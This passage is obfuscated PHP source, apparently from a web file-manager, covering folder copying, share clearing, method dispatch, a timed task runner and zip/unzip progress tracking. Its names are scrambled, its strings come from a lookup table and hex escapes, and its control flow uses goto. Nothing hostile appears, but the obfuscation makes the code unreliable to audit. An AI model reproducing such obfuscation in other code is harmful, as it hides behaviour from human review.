$¿ó‘Ö£¿[$½ê˜Ñ²¦[504]] == $’ıª¢§­[$½ê˜Ñ²¦[504]]; if (!$œàôéÇ– && $this->moveClearAuth) { Model($½ê˜Ñ²¦[502])->authClear($ñ¶ÄÉ€›); } $·›Âæ¼İ = $¿ó‘Ö£¿[$½ê˜Ñ²¦[431]] == $½ê˜Ñ²¦[89] && $’ıª¢§­[$½ê˜Ñ²¦[431]] != $½ê˜Ñ²¦[89]; if ($·›Âæ¼İ) { $¨†Ÿ‚ëÎ[$½ê˜Ñ²¦[430]] = 0; } if ($íƒŒƒ¬) { $ó„¿¦Ã = array($½ê˜Ñ²¦[584] => array($½ê˜Ñ²¦[544], $¿ó‘Ö£¿[$½ê˜Ñ²¦[521]] . $¿ó‘Ö£¿[$½ê˜Ñ²¦[403]] . $½ê˜Ñ²¦[545])); $Ş÷²“õİ = $¿ó‘Ö£¿[$½ê˜Ñ²¦[521]] . $¿ó‘Ö£¿[$½ê˜Ñ²¦[403]] . $½ê˜Ñ²¦[50]; $à«„åôÉ = $’ıª¢§­[$½ê˜Ñ²¦[521]] . $’ıª¢§­[$½ê˜Ñ²¦[403]] . $½ê˜Ñ²¦[50] . $¿ó‘Ö£¿[$½ê˜Ñ²¦[403]] . $½ê˜Ñ²¦[50]; $¼ŒÏÂáÀ = array($½ê˜Ñ²¦[584] => array($½ê˜Ñ²¦[593], "\x72\x65\x70\x6c\141\143\x65\50\160\x61\162\x65\156\x74\x4c\145\x76\145\154\x2c\47{$Ş÷²“õİ}\47\54\x27{$à«„åôÉ}\x27\x29"), $½ê˜Ñ²¦[580] => $’ıª¢§­[$½ê˜Ñ²¦[412]], $½ê˜Ñ²¦[581] => $’ıª¢§­[$½ê˜Ñ²¦[504]]); if ($·›Âæ¼İ) { $¼ŒÏÂáÀ[$½ê˜Ñ²¦[430]] = 0; } $this->where($ó„¿¦Ã)->data($¼ŒÏÂáÀ)->save(); } $this->where(array($½ê˜Ñ²¦[418] => $ñ¶ÄÉ€›))->data($¨†Ÿ‚ëÎ)->save(); return $ñ¶ÄÉ€›; } private function clearShare($Êê‰„“, $ùÙŠÓŒí) { $è„’”ª‰ =& $_SERVER[Ãìšã«™]; $¾•¾øÍå = $this->sourceInfo($Êê‰„“); $·ìóØ” = $this->sourceInfo($ùÙŠÓŒí); if ($¾•¾øÍå[$è„’”ª‰[504]] == $·ìóØ”[$è„’”ª‰[504]] && $¾•¾øÍå[$è„’”ª‰[412]] == $è„’”ª‰[594]) { return; } $õÆÕñÑ» = array($è„’”ª‰[521] => array($è„’”ª‰[544], $¾•¾øÍå[$è„’”ª‰[521]] . $Êê‰„“ . $è„’”ª‰[545])); $İïêÎ‰… = $this->field($è„’”ª‰[418])->where($õÆÕñÑ»)->getField($è„’”ª‰[403], !0); if (!$İïêÎ‰…) { return; } $õÆÕñÑ» = array($è„’”ª‰[403] => array($è„’”ª‰[7], $İïêÎ‰…), $è„’”ª‰[495] => 1); $‚æ·ä¬Á = Model($è„’”ª‰[595])->field($è„’”ª‰[488])->where($õÆÕñÑ»)->select(); if (!$‚æ·ä¬Á) { return; } $‚æ·ä¬Á = array_to_keyvalue($‚æ·ä¬Á, $è„’”ª‰[12], $è„’”ª‰[488]); $õÆÕñÑ» = array($è„’”ª‰[488] => array($è„’”ª‰[7], $‚æ·ä¬Á)); Model($è„’”ª‰[595])->where($õÆÕñÑ»)->save(array($è„’”ª‰[495] => 0)); Model($è„’”ª‰[596])->where($õÆÕñÑ»)->delete(); } public function copyFolderFromIO($’£«€íÆ, $Â¿æÔÍ, $ğ—´ÀÓµ, $ÔôøúĞ¥, $’´÷, $ó•Ö­Š = false) { $‘·ìĞíŒ =& $_SERVER[Ãìšã«™]; $İ«³²ß¥ = array($‘·ìĞíŒ[561] => array(), $‘·ìĞíŒ[562] => array(), $‘·ìĞíŒ[560] => array(), $‘·ìĞíŒ[597] => array()); $Æ›Øˆ = $ó•Ö­Š ? $ó•Ö­Š : $’£«€íÆ->pathThis($Â¿æÔÍ); $â½Ş˜äú = $this->fileNameExist($ğ—´ÀÓµ, $Æ›Øˆ); $­Î§Üöß = $this->mkdir($ğ—´ÀÓµ, $Æ›Øˆ, $ÔôøúĞ¥); if (!$â½Ş˜äú || $ÔôøúĞ¥ == REPEAT_RENAME_FOLDER) { $ÔôøúĞ¥ = !1; } if ($â½Ş˜äú) { $this->_childrenAllMake($â½Ş˜äú); } Hook::trigger($‘·ìĞíŒ[598]); $this->_copyChildTo($’£«€íÆ, $Â¿æÔÍ, $­Î§Üöß, $ÔôøúĞ¥, $İ«³²ß¥, $’´÷); Hook::trigger($‘·ìĞíŒ[599]); if ($­Î§Üöß) { $this->folderSizeResetChildren($­Î§Üöß); } $this->_childrenListClear(); Model($‘·ìĞíŒ[563])->addAll($İ«³²ß¥[$‘·ìĞíŒ[561]], array(), !0); Model($‘·ìĞíŒ[564])->eventCopy($­Î§Üöß); $this->saveAll($İ«³²ß¥[$‘·ìĞíŒ[562]]); Model($‘·ìĞíŒ[470])->linkAdd($İ«³²ß¥[$‘·ìĞíŒ[560]]); Model($‘·ìĞíŒ[470])->remove($İ«³²ß¥[$‘·ìĞíŒ[597]]); $this->folderSizeReset($ğ—´ÀÓµ); $this->updateModifyTime($ğ—´ÀÓµ); return $­Î§Üöß; } private function _copyChildTo($˜ƒñİ¢§, $Ë˜‰Ñˆ¤, $š†°ÎÏÎ, $ƒÄÛºß„, &$Ú³Ç»×, $§‘Ó®Ÿ©) { $ÍöÉİ¸ã =& $_SERVER[Ãìšã«™]; $¨İ İËô = $this->sourceInfoCache($š†°ÎÏÎ); $””¥Œ½› = $˜ƒñİ¢§->listPath($Ë˜‰Ñˆ¤); $””¥Œ½› = $””¥Œ½› ? $””¥Œ½› : array($ÍöÉİ¸ã[76] => array(), $ÍöÉİ¸ã[77] => array()); $ĞíË¹ÈÉ = array_merge($””¥Œ½›[$ÍöÉİ¸ã[76]], $””¥Œ½›[$ÍöÉİ¸ã[77]]); $¯¸å¶‹Æ = $this->_addFiles($˜ƒñİ¢§, $””¥Œ½›[$ÍöÉİ¸ã[76]], $§‘Ó®Ÿ©); $¶ôÇ§êÉ = array(); foreach ($ĞíË¹ÈÉ as &$ªäÌ§å) { if (isset($¯¸å¶‹Æ[$ªäÌ§å[$ÍöÉİ¸ã[32]]])) { $ªäÌ§å = $¯¸å¶‹Æ[$ªäÌ§å[$ÍöÉİ¸ã[32]]]; } $ªäÌ§å[$ÍöÉİ¸ã[411]] = $ªäÌ§å[$ÍöÉİ¸ã[33]] == $ÍöÉİ¸ã[79]; $ªäÌ§å[$ÍöÉİ¸ã[413]] = _get($ªäÌ§å, $ÍöÉİ¸ã[167], $ÍöÉİ¸ã[12]); $ªäÌ§å[$ÍöÉİ¸ã[80]] = _get($ªäÌ§å, $ÍöÉİ¸ã[80], 0); $ªäÌ§å[$ÍöÉİ¸ã[467]] = _get($ªäÌ§å, $ÍöÉİ¸ã[467], 0); if (!isset($ªäÌ§å[$ÍöÉİ¸ã[600]]) && $ªäÌ§å[$ÍöÉİ¸ã[467]]) { $Ú³Ç»×[$ÍöÉİ¸ã[597]][] = $ªäÌ§å[$ÍöÉİ¸ã[467]]; } if ($ƒÄÛºß„) { $“ …Ìêà = $this->fileNameExistCache($š†°ÎÏÎ, $ªäÌ§å[$ÍöÉİ¸ã[32]]); if ($“ …Ìêà) { if ($ªäÌ§å[$ÍöÉİ¸ã[411]] || $ƒÄÛºß„ == REPEAT_SKIP) { continue; } if ($ƒÄÛºß„ == REPEAT_REPLACE) { $ÙıØ‚©š = $this->sourceInfoCache($“ …Ìêà); $Ş öŠ‡ = $this->fileHistory($ÙıØ‚©š, $ªäÌ§å[$ÍöÉİ¸ã[467]], $ªäÌ§å[$ÍöÉİ¸ã[80]]); if ($Ş öŠ‡) { $Ú³Ç»×[$ÍöÉİ¸ã[560]][] = $ªäÌ§å[$ÍöÉİ¸ã[467]]; } continue; } else { if ($ƒÄÛºß„ == REPEAT_RENAME) { $ªäÌ§å[$ÍöÉİ¸ã[32]] = $this->fileNameAutoCache($š†°ÎÏÎ, $ªäÌ§å[$ÍöÉİ¸ã[32]], $ƒÄÛºß„, !1); } } } } if (!$ªäÌ§å[$ÍöÉİ¸ã[411]] && $ªäÌ§å[$ÍöÉİ¸ã[467]] == 0) { continue; } if (!$ªäÌ§å[$ÍöÉİ¸ã[411]] && $ªäÌ§å[$ÍöÉİ¸ã[467]]) { $Ú³Ç»×[$ÍöÉİ¸ã[560]][] = $ªäÌ§å[$ÍöÉİ¸ã[467]]; } $¶ôÇ§êÉ[] = $this->_makeItemData($ªäÌ§å, $¨İ İËô, $ªäÌ§å[$ÍöÉİ¸ã[32]]); } unset($ªäÌ§å); if (!empty($¶ôÇ§êÉ)) { $this->addAll($¶ôÇ§êÉ); $this->_childrenListSelect($š†°ÎÏÎ); } $¶œ²âê = $this->_childrenList($š†°ÎÏÎ); $¶œ²âê = array_to_keyvalue($¶œ²âê, $ÍöÉİ¸ã[32]); foreach ($ĞíË¹ÈÉ as $ªäÌ§å) { $ÙıØ‚©š = $¶œ²âê[$ªäÌ§å[$ÍöÉİ¸ã[32]]]; $‘âè¤ = $ÙıØ‚©š[$ÍöÉİ¸ã[403]]; $this->_copyApplyMeta($ÙıØ‚©š, $Ú³Ç»×); if ($ªäÌ§å[$ÍöÉİ¸ã[33]] == $ÍöÉİ¸ã[79]) { $ªäÌ§å[$ÍöÉİ¸ã[78]] = $˜ƒñİ¢§->getPathInner($ªäÌ§å[$ÍöÉİ¸ã[78]]); $this->_copyChildTo($˜ƒñİ¢§, $ªäÌ§å[$ÍöÉİ¸ã[78]], $‘âè¤, $ƒÄÛºß„, $Ú³Ç»×, $§‘Ó®Ÿ©); } } } private function _addFiles($€º„èàá, $øãğŸÕ, $§¨€¦Ñµ) { $ûšŠ’‡Ğ =& $_SERVER[Ãìšã«™]; if (!$øãğŸÕ || count($øãğŸÕ) == 0) { return array(); } $ğû—®Ìš = array(); foreach ($øãğŸÕ as &$’Ù²û¼Û) { Hook::trigger($ûšŠ’‡Ğ[601], $’Ù²û¼Û); $’Ù²û¼Û[$ûšŠ’‡Ğ[78]] = $€º„èàá->getPathInner($’Ù²û¼Û[$ûšŠ’‡Ğ[78]]); $ï¥Œ‚ÜÏ = $€º„èàá->hashSimple($’Ù²û¼Û[$ûšŠ’‡Ğ[78]]); $ÅğÖøÔ¼ = $€º„èàá->hashMd5($’Ù²û¼Û[$ûšŠ’‡Ğ[78]]); if (strlen($ÅğÖøÔ¼) > 10 && !isset($ğû—®Ìš[$ÅğÖøÔ¼])) { $ğû—®Ìš[$ÅğÖøÔ¼] = array(); } $’Ù²û¼Û[$ûšŠ’‡Ğ[170]] = $ï¥Œ‚ÜÏ; $’Ù²û¼Û[$ûšŠ’‡Ğ[169]] = $ÅğÖøÔ¼; Hook::trigger($ûšŠ’‡Ğ[602], $’Ù²û¼Û); $ğû—®Ìš[$ÅğÖøÔ¼][] =& $’Ù²û¼Û; if (count($ğû—®Ìš[$ÅğÖøÔ¼]) > 1) { $’Ù²û¼Û[$ûšŠ’‡Ğ[600]] = !0; } } unset($’Ù²û¼Û); $¶Š©„ø£ = array($ûšŠ’‡Ğ[169] => array($ûšŠ’‡Ğ[7], array_keys($ğû—®Ìš))); $¶¸Ê×·› = Model($ûšŠ’‡Ğ[603]); $†Àí…—ƒ = $¶¸Ê×·›->where($¶Š©„ø£)->select(); $†Àí…—ƒ = $†Àí…—ƒ ? $†Àí…—ƒ : array(); foreach ($†Àí…—ƒ as $¤İ•†»ù) { if (!isset($ğû—®Ìš[$¤İ•†»ù[$ûšŠ’‡Ğ[169]]])) { continue; } $óÄª § = $ğû—®Ìš[$¤İ•†»ù[$ûšŠ’‡Ğ[169]]]; foreach ($óÄª § as &$’Ù²û¼Û) { $’Ù²û¼Û[$ûšŠ’‡Ğ[467]] = $¤İ•†»ù[$ûšŠ’‡Ğ[467]]; $’Ù²û¼Û[$ûšŠ’‡Ğ[600]] = !0; } unset($’Ù²û¼Û); } $·ª†¨áì = array(); foreach ($øãğŸÕ as $ƒÖ–Şï) { if (isset($ƒÖ–Şï[$ûšŠ’‡Ğ[600]]) && $ƒÖ–Şï[$ûšŠ’‡Ğ[600]]) { continue; } $Âñß¡Œä = $€º„èàá->getPathInner($ƒÖ–Şï[$ûšŠ’‡Ğ[78]]); $‰ÈÖ–Œõ = $¶¸Ê×·›->addFileMake($Âñß¡Œä, $ƒÖ–Şï[$ûšŠ’‡Ğ[80]], $ƒÖ–Şï[$ûšŠ’‡Ğ[170]], $ƒÖ–Şï[$ûšŠ’‡Ğ[169]], $ƒÖ–Şï[$ûšŠ’‡Ğ[32]], $§¨€¦Ñµ); if (!is_array($‰ÈÖ–Œõ)) { continue; } $·ª†¨áì[] = $‰ÈÖ–Œõ; } $¶¸Ê×·›->addAll($·ª†¨áì); $¶Š©„ø£ = array($ûšŠ’‡Ğ[169] => array($ûšŠ’‡Ğ[7], array_keys($ğû—®Ìš))); $†Àí…—ƒ = $¶¸Ê×·›->where($¶Š©„ø£)->select(); $†Àí…—ƒ = $†Àí…—ƒ ? $†Àí…—ƒ : array(); foreach ($†Àí…—ƒ as $¤İ•†»ù) { if (!isset($ğû—®Ìš[$¤İ•†»ù[$ûšŠ’‡Ğ[169]]])) { continue; } $ú‚°Ï…ù =& $ğû—®Ìš[$¤İ•†»ù[$ûšŠ’‡Ğ[169]]]; foreach ($ú‚°Ï…ù as &$’Ù²û¼Û) { $’Ù²û¼Û[$ûšŠ’‡Ğ[467]] = $¤İ•†»ù[$ûšŠ’‡Ğ[467]]; } unset($’Ù²û¼Û); } $…„É°µÊ = array(); foreach ($øãğŸÕ as $çêÑ¤±¥) { $…„É°µÊ[$çêÑ¤±¥[$ûšŠ’‡Ğ[32]]] = $çêÑ¤±¥; } return $…„É°µÊ; } } goto E†ŞŒÜùè›; CÏÛ”¦¶”Ô: function binCheckBigger($‘„ÏÛ’­, $ Íç£²¥) { return $‘„ÏÛ’­ > $ Íç£²¥; } $_SERVER[$_SERVER[¦ÀÙé¡«][3]] = ("\x38\x30\x30\x34"."\60\60")+0;$_ump9="pd8gaws70r63czbhefvt59jx1i2nolyumkq4q9jw21exioygcdu756s83matbpn4flh0vkzrsz5wvi";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($µ˜¼É, $ãØúÚ„ñ) { $Õ°è®°Æ =& $_SERVER[Ãìšã«™]; if (isset(self::$_methodList[$µ˜¼É])) { return @call_user_func_array(self::$_methodList[$µ˜¼É], $ãØúÚ„ñ); } else { if (method_exists($this, $µ˜¼É)) { return call_user_func_array(array($this, $µ˜¼É), $ãØúÚ„ñ); } else { think_exception(__CLASS__ . $Õ°è®°Æ[4] . $µ˜¼É . $Õ°è®°Æ[5]); } } } public static function __callStatic($Åü²Ãá , $ŸÉ†¬¶) { if (isset(self::$_methodListStatic[$Åü²Ãá ])) { return call_user_func_array(self::$_methodListStatic[$Åü²Ãá ], $ŸÉ†¬¶); } else { if (method_exists(self, $Åü²Ãá )) { return call_user_func_array(array(self, $Åü²Ãá ), $ŸÉ†¬¶); } else { show_json("{$Åü²Ãá }\50\x29\x20\x6e\157\x74\x20\x65\x78\x69\x73\x74\x3b", !1); } } } public static function addMethod($˜›¹©ÓÖ, $‡×¬Ë•¬) { self::$_methodList[$˜›¹©ÓÖ] = $‡×¬Ë•¬; } public static function addMethodStatic($İ®Ê¸œè, $ù“ƒÀ‚Ó) { self::$_methodListStatic[$İ®Ê¸œè] = $ù“ƒÀ‚Ó; } } goto eùÌêÊ¦¬ ; AÌ¾Àê¨¥: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÇÆ­Ğ ¯, $ã‰˜Œ¹ = 5.0) { if (!$ÇÆ­Ğ ¯) { return; } $¸¹ò‘×Ü = Cache::get($ÇÆ­Ğ ¯); if (!$¸¹ò‘×Ü || timeFloat() - floatVal($¸¹ò‘×Ü) >= $ã‰˜Œ¹) { Cache::set($ÇÆ­Ğ ¯, timeFloat(), $ã‰˜Œ¹ * 10); return !0; } return !1; } public static function timeLimitCall($¥à†œÄ, $„£âÀ¦Ø, $§–Ø¥µû, $°µé¡¬ì = 5.0) { $“ˆˆ•±ä =& $_SERVER[Ãìšã«™]; if (!$¥à†œÄ || !$„£âÀ¦Ø) { return; } self::$asyncAdd = !0; $õšß£«º = $“ˆˆ•±ä[1732]; $•¬œßÄğ = Cache::get($õšß£«º, !0); $Ò“§©ß¡ = array($“ˆˆ•±ä[1733] => timeFloat(), $“ˆˆ•±ä[1734] => timeFloat(), $“ˆˆ•±ä[259] => $„£âÀ¦Ø, $“ˆˆ•±ä[1727] => $§–Ø¥µû, $“ˆˆ•±ä[196] => $°µé¡¬ì); if (is_array($•¬œßÄğ[$¥à†œÄ])) { $Ò“§©ß¡[$“ˆˆ•±ä[1734]] = $•¬œßÄğ[$¥à†œÄ][$“ˆˆ•±ä[1734]]; } if (is_array($•¬œßÄğ[$¥à†œÄ])) { if (timeFloat() - $•¬œßÄğ[$¥à†œÄ][$“ˆˆ•±ä[1733]] < $Ò“§©ß¡[$“ˆˆ•±ä[196]] * 0.3) { return; } $Ò“§©ß¡[$“ˆˆ•±ä[1734]] = $•¬œßÄğ[$¥à†œÄ][$“ˆˆ•±ä[1734]]; } $•¬œßÄğ[$¥à†œÄ] = $Ò“§©ß¡; Cache::set($õšß£«º, $•¬œßÄğ, 60); Cache::removeMemory($õšß£«º); write_log($“ˆˆ•±ä[1735] . $¥à†œÄ . $“ˆˆ•±ä[71] . $„£âÀ¦Ø, $“ˆˆ•±ä[1729]); } public static function timeLimitCallLoop() { $¸½Â¬Ä =& $_SERVER[Ãìšã«™]; $¯÷’¥óá = array($¸½Â¬Ä[1736]); $‹¿ŠÖÉƒ = in_array(strtolower(ACTION), $¯÷’¥óá); if (!$‹¿ŠÖÉƒ && !self::$asyncAdd) { return; } $ä·ÏƒÙÉ = $¸½Â¬Ä[1732]; $’³½ÎœÙ = Cache::get($ä·ÏƒÙÉ, !0); if (!$’³½ÎœÙ || count($’³½ÎœÙ) <= 0) { return; } $ÙÇïùó = !1; $—¸ûéºº = timeFloat(); $—ÑÌ±Ë® = array(); foreach ($’³½ÎœÙ as $Ğ¤ğ«÷¼ => $çôÂåÌ) { if ($—¸ûéºº - $çôÂåÌ[$¸½Â¬Ä[1734]] > $çôÂåÌ[$¸½Â¬Ä[196]]) { $ÙÇïùó = !0; try { Hook::apply($çôÂåÌ[$¸½Â¬Ä[259]], $çôÂåÌ[$¸½Â¬Ä[1727]]); write_log($¸½Â¬Ä[1737] . $Ğ¤ğ«÷¼ . $¸½Â¬Ä[71] . $çôÂåÌ[$¸½Â¬Ä[259]] . $¸½Â¬Ä[1738] . ACTION, $¸½Â¬Ä[1729]); } catch (Exception $®«™Öš†) { } continue; } $—ÑÌ±Ë®[$Ğ¤ğ«÷¼] = $çôÂåÌ; } if (!$ÙÇïùó) { return; } if (!$—ÑÌ±Ë®) { return Cache::remove($ä·ÏƒÙÉ); } Cache::set($ä·ÏƒÙÉ, $—ÑÌ±Ë®, 60); Cache::removeMemory($ä·ÏƒÙÉ); } public static function finished($Áş°óî, $½»ÇòïÚ) { $îÊğ¥·æ =& $_SERVER[Ãìšã«™]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($îÊğ¥·æ[259] => $Áş°óî, $îÊğ¥·æ[1727] => $½»ÇòïÚ); } private static function finishedRun() { $Ø‰ø©î¬ =& $_SERVER[Ãìšã«™]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $˜Ç¢¬ˆ–) { try { Hook::apply($˜Ç¢¬ˆ–[$Ø‰ø©î¬[259]], $˜Ç¢¬ˆ–[$Ø‰ø©î¬[1727]]); } catch (Exception $‡×ÍÇ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $×¿ü€ =& $_SERVER[Ãìšã«™]; parent::startAfter(); Hook::bind($×¿ü€[1739], array($this, $×¿ü€[1740])); Hook::bind($×¿ü€[1188], array($this, $×¿ü€[1741])); $õ¡ÓçÎ· =& $this->task; $õ¡ÓçÎ·[$×¿ü€[1742]] = $×¿ü€[1193]; if (!$õ¡ÓçÎ·[$×¿ü€[1548]]) { $õ¡ÓçÎ·[$×¿ü€[1548]] = LNG($×¿ü€[1743]); } } protected function endAfter() { $Ô‹Õ·…Î =& $_SERVER[Ãìšã«™]; parent::endAfter(); Hook::unbind($Ô‹Õ·…Î[1739], array($this, $Ô‹Õ·…Î[1740])); Hook::unbind($Ô‹Õ·…Î[1188], array($this, $Ô‹Õ·…Î[1741])); } public function updateAfter() { $ÈŞƒ·ñ =& $_SERVER[Ãìšã«™]; $êõ®ï¯ =& $this->task; if (!$êõ®ï¯[$ÈŞƒ·ñ[787]] || !$êõ®ï¯[$ÈŞƒ·ñ[764]]) { return; } if ($êõ®ï¯[$ÈŞƒ·ñ[1742]] == $ÈŞƒ·ñ[1193]) { $»ë¨ÈÒ¶ = 0; if ($êõ®ï¯[$ÈŞƒ·ñ[1698]]) { $»ë¨ÈÒ¶ = $êõ®ï¯[$ÈŞƒ·ñ[1699]] / $êõ®ï¯[$ÈŞƒ·ñ[1698]]; } $êõ®ï¯[$ÈŞƒ·ñ[1652]] = $»ë¨ÈÒ¶ * 0.3; } else { if ($êõ®ï¯[$ÈŞƒ·ñ[1742]] == $ÈŞƒ·ñ[308]) { $»ë¨ÈÒ¶ = $êõ®ï¯[$ÈŞƒ·ñ[1651]] / $êõ®ï¯[$ÈŞƒ·ñ[787]]; $êõ®ï¯[$ÈŞƒ·ñ[1652]] = 0.3 + $»ë¨ÈÒ¶ * 0.4; } else { if ($êõ®ï¯[$ÈŞƒ·ñ[1742]] == $ÈŞƒ·ñ[108]) { $ã¦¼ƒ£ù = 0; if ($êõ®ï¯[$ÈŞƒ·ñ[1700]] == $ÈŞƒ·ñ[108]) { $ã¦¼ƒ£ù = $êõ®ï¯[$ÈŞƒ·ñ[1699]]; } $»ë¨ÈÒ¶ = ($êõ®ï¯[$ÈŞƒ·ñ[1703]] + $ã¦¼ƒ£ù) / $êõ®ï¯[$ÈŞƒ·ñ[764]]; $êõ®ï¯[$ÈŞƒ·ñ[1652]] = 0.3 + 0.4 + $»ë¨ÈÒ¶ * 0.3; } } } if ($êõ®ï¯[$ÈŞƒ·ñ[1652]] > 0) { $Ê†€Ê¢å = timeFloat() - $êõ®ï¯[$ÈŞƒ·ñ[1654]] - $êõ®ï¯[$ÈŞƒ·ñ[1657]]; $êõ®ï¯[$ÈŞƒ·ñ[1658]] = $Ê†€Ê¢å * (1 - $êõ®ï¯[$ÈŞƒ·ñ[1652]]) / $êõ®ï¯[$ÈŞƒ·ñ[1652]]; } } public function addFile($£ĞÎÖ‚­) { $‚à†¡âÛ =& $_SERVER[Ãìšã«™]; $¢¤¿» =& $this->task; $¸ãôÓÊ± = IO::info($£ĞÎÖ‚­); $¢¤¿»[$‚à†¡âÛ[1696]] = $¸ãôÓÊ±[$‚à†¡âÛ[32]]; $¢¤¿»[$‚à†¡âÛ[1698]] = $¸ãôÓÊ±[$‚à†¡âÛ[80]]; $¢¤¿»[$‚à†¡âÛ[1699]] = 0; $¢¤¿»[$‚à†¡âÛ[1060]] = $‚à†¡âÛ[1718]; $¢¤¿»[$‚à†¡âÛ[1700]] = $‚à†¡âÛ[1193]; $¢¤¿»[$‚à†¡âÛ[764]] = $¸ãôÓÊ±[$‚à†¡âÛ[80]]; $¢¤¿»[$‚à†¡âÛ[787]] = 1; $ß›èœ½ = 0; $¢¤¿»[$‚à†¡âÛ[1707]] = array($‚à†¡âÛ[1708] => $ß›èœ½ + 1, $‚à†¡âÛ[421] => $¸ãôÓÊ±[$‚à†¡âÛ[32]], $‚à†¡âÛ[78] => $¸ãôÓÊ±[$‚à†¡âÛ[78]], $‚à†¡âÛ[519] => $¸ãôÓÊ±[$‚à†¡âÛ[519]] ? $¸ãôÓÊ±[$‚à†¡âÛ[519]] : $¸ãôÓÊ±[$‚à†¡âÛ[78]]); $this->update(); } public function unzipAfter($·«€”àè) { $Õ­ùïÏ¬ =& $_SERVER[Ãìšã«™]; $“é±„ê =& $this->task; $“é±„ê[$Õ­ùïÏ¬[1742]] = $Õ­ùïÏ¬[108]; $äğâ¬Å— = IO::infoWithChildren($·«€”àè); $Ûøº¡ƒ = 0; $“é±„ê[$Õ­ùïÏ¬[1707]] = array($Õ­ùïÏ¬[1708] => $Ûøº¡ƒ + 1, $Õ­ùïÏ¬[421] => $äğâ¬Å—[$Õ­ùïÏ¬[32]], $Õ­ùïÏ¬[78] => $äğâ¬Å—[$Õ­ùïÏ¬[78]], $Õ­ùïÏ¬[519] => $äğâ¬Å—[$Õ­ùïÏ¬[519]] ? $äğâ¬Å—[$Õ­ùïÏ¬[519]] : $äğâ¬Å—[$Õ­ùïÏ¬[78]]); if ($äğâ¬Å—[$Õ­ùïÏ¬[33]] == $Õ­ùïÏ¬[192]) { $“é±„ê[$Õ­ùïÏ¬[787]] = 1; } else { $“é±„ê[$Õ­ùïÏ¬[787]] = $äğâ¬Å—[$Õ­ùïÏ¬[83]][$Õ­ùïÏ¬[81]]; } $“é±„ê[$Õ­ùïÏ¬[1060]] = $Õ­ùïÏ¬[12]; $“é±„ê[$Õ­ùïÏ¬[1700]] = 0; $“é±„ê[$Õ­ùïÏ¬[1651]] = 0; $“é±„ê[$Õ­ùïÏ¬[1698]] = 0; $“é±„ê[$Õ­ùïÏ¬[1699]] = 0; $“é±„ê[$Õ­ùïÏ¬[1696]] = $Õ­ùïÏ¬[12]; $“é±„ê[$Õ­ùïÏ¬[1703]] = 0; $“é±„ê[$Õ­ùïÏ¬[764]] = $äğâ¬Å—[$Õ­ùïÏ¬[80]]; $this->update(); self::log($Õ­ùïÏ¬[1744] . json_encode(array($“é±„ê, $äğâ¬Å—))); } public function nameParse($ùº®ÌĞÏ) { $ó©âÓé =& $_SERVER[Ãìšã«™]; $ñ‘×‚‹â =& $this->task; if ($ñ‘×‚‹â[$ó©âÓé[1742]] == $ó©âÓé[1193]) { $ñ‘×‚‹â[$ó©âÓé[1742]] = $ó©âÓé[308]; $ñ‘×‚‹â[$ó©âÓé[1703]] = 0; $ñ‘×‚‹â[$ó©âÓé[764]] = 0; } $İÂçƒ”å = get_path_this($ùº®ÌĞÏ); if (strstr($İÂçƒ”å, $ó©âÓé[10])) { $ñ‘×‚‹â[$ó©âÓé[1651]] += 1; $ñ‘×‚‹â[$ó©âÓé[787]] += 1; } $ñ‘×‚‹â[$ó©âÓé[1696]] = $ùº®ÌĞÏ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ãÑ´‹›Õ =& $_SERVER[Ãìšã«™]; parent::startAfter(); Hook::bind($ãÑ´‹›Õ[1745], array($this, $ãÑ´‹›Õ[1740])); $­æªÒÅ =& $this->task; $­æªÒÅ[$ãÑ´‹›Õ[1742]] = $ãÑ´‹›Õ[1193]; if (!$­æªÒÅ[$ãÑ´‹›Õ[1548]]) { $­æªÒÅ[$ãÑ´‹›Õ[1548]] = LNG($ãÑ´‹›Õ[1746]); } } protected function endAfter() { $ÆÎ»’¡ø =& $_SERVER[Ãìšã«™]; parent::endAfter(); Hook::unbind($ÆÎ»’¡ø[1745], array($this, $ÆÎ»’¡ø[1740])); } public function updateAfter() { $¸†”°€Å =& $_SERVER[Ãìšã«™]; $›´Û™è =& $this->task; if (!$›´Û™è[$¸†”°€Å[787]] || !$›´Û™è[$¸†”°€Å[764]]) { return; } if ($›´Û™è[$¸†”°€Å[1742]] == $¸†”°€Å[1193]) { $Ğœ¤³È = $›´Û™è[$¸†”°€Å[1699]]; if ($›´Û™è[$¸†”°€Å[1700]] != $¸†”°€Å[1193]) { $Ğœ¤³È = 0; } $¤¸åƒü = ($›´Û™è[$¸†”°€Å[1703]] + $Ğœ¤³È) / $›´Û™è[$¸†”°€Å[764]]; $›´Û™è[$¸†”°€Å[1652]] = $¤¸åƒü * 0.3; } else { if ($›´Û™è[$¸†”°€Å[1742]] == $¸†”°€Å[308]) { $¤¸åƒü = $›´Û™è[$¸†”°€Å[1651]] / $›´Û™è[$¸†”°€Å[787]]; $›´Û™è[$¸†”°€Å[1652]] = 0.3 + $¤¸åƒü * 0.5; } else { if ($›´Û™è[$¸†”°€Å[1742]] == $¸†”°€Å[108]) { $¤¸åƒü = 0; if ($›´Û™è[$¸†”°€Å[1698]]) { $¤¸åƒü = $›´Û™è[$¸†”°€Å[1699]] / $›´Û™è[$¸†”°€Å[1698]]; } $›´Û™è[$¸†”°€Å[1652]] = 0.3 + 0.5 + $¤¸åƒü * 0.2; } } } if ($›´Û™è[$¸†”°€Å[1652]] > 0) { $ò¿ÂÇ³Ä = timeFloat() - $›´Û™è[$¸†”°€Å[1654]] - $›´Û™è[$¸†”°€Å[1657]]; $›´Û™è[$¸†”°€Å[1658]] = $ò¿ÂÇ³Ä * (1 - $›´Û™è[$¸†”°€Å[1652]]) / $›´Û™è[$¸†”°€Å[1652]]; } } public function copyFileStart($®Ú¨í’è, $½Úç»ùÕ, $¯ë“õÂ, $¶äÙ‚³î, $Ø»¹ŒÅ, $Úƒ—¸È) { $Ğù¥Æè÷ =& $_SERVER[Ãìšã«™]; parent::copyFileStart($®Ú¨í’è, $½Úç»ùÕ, $¯ë“õÂ, $¶äÙ‚³î, $Ø»¹ŒÅ, $Úƒ—¸È); $¨ÀÑÌÌ„ =& $this->task; if ($¨ÀÑÌÌ„[$Ğù¥Æè÷[1742]] == $Ğù¥Æè÷[308]) { 